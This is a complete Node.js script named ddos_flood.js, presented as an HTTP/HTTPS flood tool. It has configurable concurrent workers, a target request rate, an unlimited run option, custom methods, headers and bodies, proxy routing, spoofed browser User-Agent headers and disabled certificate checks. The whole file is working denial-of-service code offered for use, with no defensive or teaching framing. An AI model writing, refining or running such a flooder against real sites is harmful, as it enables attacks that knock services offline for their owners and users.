#!/usr/bin/env node
/**
 * HTTP / HTTPS flood — pure Node.js, no external deps
 * Usage:
 *   node ddos_flood.js <url> [options]
 *
 * Options:
 *   --workers <n>     concurrent sockets          (default 128)
 *   --rps <n>         target aggregate rps        (default 2000)
 *   --duration <sec>  stop after N seconds        (default 0 = forever)
 *   --method <m>      GET | POST | HEAD           (default GET)
 *   --path <p>        force path (overrides url)  (default from url)
 *   --keep-alive      reuse connections           (default on)
 *   --no-keep-alive   disable keep-alive
 *   --header "K: V"   extra header (repeatable)
 *   --body <str>      POST body
 *   --proxy <host:port>  optional HTTP proxy
 *
 * Example:
 *   node ddos_flood.js https://target.example --workers 256 --rps 5000 --duration 60
 */

"use strict";

const http  = require("http");
const https = require("https");
const { URL } = require("url");
const { performance } = require("perf_hooks");

// ── args ──────────────────────────────────────────────────────────────
const args = process.argv.slice(2);
if (args.length === 0 || args[0] === "-h" || args[0] === "--help") {
  console.log(`usage: node ddos_flood.js <url> [--workers N] [--rps N] [--duration SEC] [--method M] [--header "K: V"] [--body STR]`);
  process.exit(0);
}

let targetUrl   = args[0];
let workers     = 128;
let targetRps   = 2000;
let duration    = 0;
let method      = "GET";
let forcePath   = null;
let keepAlive   = true;
let body        = null;
let extraHeaders = {};
let proxy       = null;

for (let i = 1; i < args.length; i++) {
  const a = args[i];
  if (a === "--workers")      workers   = Math.max(1, parseInt(args[++i], 10) || 128);
  else if (a === "--rps")     targetRps = Math.max(1, parseInt(args[++i], 10) || 2000);
  else if (a === "--duration") duration = Math.max(0, parseInt(args[++i], 10) || 0);
  else if (a === "--method")  method    = (args[++i] || "GET").toUpperCase();
  else if (a === "--path")    forcePath = args[++i];
  else if (a === "--keep-alive") keepAlive = true;
  else if (a === "--no-keep-alive") keepAlive = false;
  else if (a === "--body")    body      = args[++i];
  else if (a === "--header") {
    const hv = args[++i] || "";
    const idx = hv.indexOf(":");
    if (idx > 0) extraHeaders[hv.slice(0, idx).trim()] = hv.slice(idx + 1).trim();
  }
  else if (a === "--proxy")   proxy = args[++i];
}

if (!/^https?:\/\//i.test(targetUrl)) targetUrl = "http://" + targetUrl;

let parsed;
try {
  parsed = new URL(targetUrl);
} catch (e) {
  console.error("bad url:", targetUrl);
  process.exit(1);
}

const isHttps = parsed.protocol === "https:";
const host    = parsed.hostname;
const port    = parsed.port ? parseInt(parsed.port, 10) : (isHttps ? 443 : 80);
const path    = forcePath || (parsed.pathname + parsed.search) || "/";

// ── agents ────────────────────────────────────────────────────────────
const Agent = isHttps ? https.Agent : http.Agent;
const agent = new Agent({
  keepAlive,
  maxSockets: workers * 2,
  maxFreeSockets: workers,
  timeout: 10000,
  scheduling: "lifo"
});

const lib = isHttps ? https : http;

// ── stats ─────────────────────────────────────────────────────────────
let sent = 0, ok = 0, err = 0, bytes = 0;
let running = true;
const startTs = performance.now();
let lastSent = 0;
let lastTs = startTs;

function printStats() {
  const now = performance.now();
  const elapsed = (now - startTs) / 1000;
  const dt = (now - lastTs) / 1000;
  const currRps = dt > 0 ? Math.round((sent - lastSent) / dt) : 0;
  lastSent = sent;
  lastTs = now;

  process.stdout.write(
    `\r[flood] ${elapsed.toFixed(1)}s | sent=${sent} ok=${ok} err=${err} | rps≈${currRps} | bytes=${(bytes/1024).toFixed(1)}KB   `
  );
}

// ── request factory ───────────────────────────────────────────────────
function fireOne() {
  if (!running) return;

  const headers = Object.assign({
    "Host": host,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Encoding": "identity",
    "Connection": keepAlive ? "keep-alive" : "close",
    "Cache-Control": "no-cache"
  }, extraHeaders);

  if (body && method !== "GET" && method !== "HEAD") {
    headers["Content-Length"] = Buffer.byteLength(body);
    headers["Content-Type"] = headers["Content-Type"] || "application/x-www-form-urlencoded";
  }

  const opts = {
    hostname: host,
    port,
    path,
    method,
    headers,
    agent,
    timeout: 8000,
    rejectUnauthorized: false   // ignore cert errors for stress targets
  };

  // optional proxy (CONNECT not implemented — only plain HTTP proxy)
  if (proxy) {
    const [ph, pp] = proxy.split(":");
    opts.hostname = ph;
    opts.port = parseInt(pp, 10) || 80;
    opts.path = `${parsed.protocol}//${host}:${port}${path}`;
    opts.headers["Host"] = host;
  }

  const req = lib.request(opts, (res) => {
    sent++;
    if (res.statusCode >= 200 && res.statusCode < 500) ok++;
    else err++;

    res.on("data", (chunk) => { bytes += chunk.length; });
    res.on("end", () => {});
    // drain fast so socket can be reused
    res.resume();
  });

  req.on("error", () => {
    sent++;
    err++;
  });

  req.on("timeout", () => {
    req.destroy();
    sent++;
    err++;
  });

  if (body && method !== "GET" && method !== "HEAD") {
    req.write(body);
  }
  req.end();
}

// ── worker pool ───────────────────────────────────────────────────────
// each worker schedules itself with a calculated delay to hit targetRps
const delayMs = Math.max(0, (workers * 1000) / targetRps);

function worker(id) {
  if (!running) return;
  fireOne();
  // slight jitter so they don't all land on the same millisecond
  const jitter = (Math.random() - 0.5) * delayMs * 0.15;
  setTimeout(() => worker(id), delayMs + jitter);
}

// ── start ─────────────────────────────────────────────────────────────
console.log(`target   : ${method} ${targetUrl}`);
console.log(`path     : ${path}`);
console.log(`workers  : ${workers}`);
console.log(`rps goal : ${targetRps}  (delay≈${delayMs.toFixed(1)}ms)`);
console.log(`keepAlive: ${keepAlive}`);
console.log(`duration : ${duration > 0 ? duration + "s" : "infinite"}`);
console.log("---");

for (let i = 0; i < workers; i++) {
  // stagger the first wave a few ms so we don't open 128 sockets in the same tick
  setTimeout(() => worker(i), i * 2);
}

const statsTimer = setInterval(printStats, 500);

function shutdown(code) {
  if (!running) return;
  running = false;
  clearInterval(statsTimer);
  agent.destroy();
  printStats();
  console.log("\n[flood] stopped");
  process.exit(code || 0);
}

process.on("SIGINT",  () => shutdown(0));
process.on("SIGTERM", () => shutdown(0));

if (duration > 0) {
  setTimeout(() => shutdown(0), duration * 1000);
}
